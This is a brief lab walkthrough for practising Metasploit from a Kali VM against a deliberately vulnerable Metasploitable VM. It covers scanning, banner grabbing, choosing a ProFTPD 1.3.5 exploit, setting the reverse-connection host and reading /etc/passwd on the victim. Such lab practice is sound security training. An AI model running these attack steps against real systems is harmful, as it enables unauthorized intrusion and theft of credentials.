# Metasploit

This is how to practice using Metasploit this setup.

We will use `kali1` as the attacker, and `metasploitable` as the victim.

Run `vagrant up kali1 metasploitable` to start the VMs.

On `metasploitable`, run `msfconsole` to start the Metasploit console.

## FTP

`nmap metasploitable` shows FTP is open. `nc metasploitable ftp` (or `nc
192.168.56.21 21`) shows us the FTP version: `ProFTPs 1.3.5`.

From here, you can `search proftpd 1.3.5` to find existing exploits for the
ProFTPD version installed on `metasploitable`.

Then, `info 0` to look at how to use the exploit with index 0.

`use 0` to use.

Set variables:

* `set rhosts 192.168.56.21` - Remote host, `metasploitable`
* `set lhost 192.168.56.11` - Local host, `kali1`
* `set sitepath /var/www/html` - Web server root. Found by testing `/var/www`
  and `/srv/www` etc.

Look at the sessions: `sessions`

Connect to the session: `sessions -i 1`

`cat /etc/passwd` shows us we're in.
